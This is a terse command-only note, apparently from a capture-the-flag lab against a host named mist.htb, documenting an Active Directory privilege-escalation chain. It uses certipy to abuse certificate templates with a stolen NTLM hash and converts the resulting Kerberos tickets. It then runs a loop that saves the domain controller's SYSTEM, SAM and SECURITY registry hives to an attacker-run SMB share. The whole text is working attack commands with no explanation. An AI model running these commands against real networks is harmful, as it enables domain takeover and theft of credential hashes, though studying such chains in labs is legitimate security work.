## exps

```
proxychains4 certipy req -u 'svc_cabackup' -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -template 'ManagerAuthentication' -ca mist-DC01-CA  -dc-ip 192.168.100.100 -key-size 4096

proxychains4 certipy auth -pfx svc_cabackup.pfx -dc-ip 192.168.100.100 -kirbi

ticketConverter.py svc_cabackup.kirbi svc_cabackup_step1.ccache

export KRB5CCNAME=svc_cabackup_step1.ccache

proxychains4 -q certipy req -ca 'Mist-DC01-CA' -template 'BackupSvcAuthentication' -dc-ip '192.168.100.100' -k -no-pass -dns-tcp -ns '192.168.100.100' -target 'dc01.mist.htb' -debug -key-size 4096

proxychains4 certipy auth -pfx svc_cabackup.pfx -dc-ip 192.168.100.100 -kirbi

ticketConverter.py svc_cabackup.kirbi svc_cabackup.ccache 

export KRB5CCNAME=svc_cabackup.ccache

> launched smbserver
> smbserver.py share `pwd` -smb2support

for hive in SYSTEM SAM SECURITY
do proxychains4 reg.py -k -no-pass -debug svc_cabackup@dc01.mist.htb -dc-ip 192.168.100.100 save -o '\\10.10.16.14\share' -keyName "HKLM\\$hive"
done


```